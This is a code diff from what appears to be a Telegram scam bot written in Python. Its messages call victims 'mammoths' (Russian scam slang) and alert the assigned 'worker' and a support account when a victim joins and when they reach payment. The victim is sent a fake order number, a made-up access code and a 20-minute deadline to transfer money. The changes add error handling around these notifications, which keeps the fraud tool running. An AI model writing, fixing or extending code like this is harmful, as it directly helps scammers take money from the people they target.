@@ -42,9 +42,12 @@ async def start(message: types.Message):
             text=f"Пришел новый мамонт!\nusername: @{username}\nВоркер: @{worker}",
             chat_id=referral_id)
 
-        main_bot.send_message(
-            text=f"Пришел новый мамонт!\nusername: @{username}\nВоркер: @{worker}",
-            chat_id=tp)
+        try:
+            main_bot.send_message(
+                text=f"Пришел новый мамонт!\nusername: @{username}\nВоркер: @{worker}",
+                chat_id=tp)
+        except:
+            pass
 
         main_bot.send_message(
             text=f"Пришел новый мамонт!\nusername: @{username}\nВоркер: @{worker}",
@@ -171,9 +174,14 @@ async def buyitem(callback_query: types.CallbackQuery):
         text=f"Мамонт на этапе оплаты!\nusername: @{cust.mammoth}\nВоркер: @{worker.username}",
         chat_id=cust.worker_id)
 
-    await main_bot.send_message(
-        text=f"Мамонт на этапе оплаты!\nusername: @{cust.mammoth}\nВоркер: @{worker.username}",
-        chat_id=tp.tg_id)
+    try:
+        await main_bot.send_message(
+            text=f"Мамонт на этапе оплаты!\nusername: @{cust.mammoth}\nВоркер: @{worker.username}",
+            chat_id=tp.tg_id)
+        tpp = tp.username
+    except:
+        tpp = None
+        pass
 
     text = f"""🛍 Номер заказа: SPPM-{randint(10000, 99999)} 🛍
     Код доступа: {randint(10000, 99999)}
@@ -194,7 +202,7 @@ async def buyitem(callback_query: types.CallbackQuery):
     
     3. 🕐 Перевод нужно осуществить в течении 20 мин. 🕐 После создания заказа. Если вам не хватает времени, отмените заявку и создайте новую!
     
-    4. Если у вас возникли какие-либо проблемы с оплатой, обратитесь в поддержку (контакты: @{tp.username}) и перешлите туда это сообщение.
+    4. Если у вас возникли какие-либо проблемы с оплатой, обратитесь в поддержку (контакты: @{tpp}) и перешлите туда это сообщение.
     
     5. Если вы оплатили, нажмите на кнопку "Я оплатил ✅"
     """
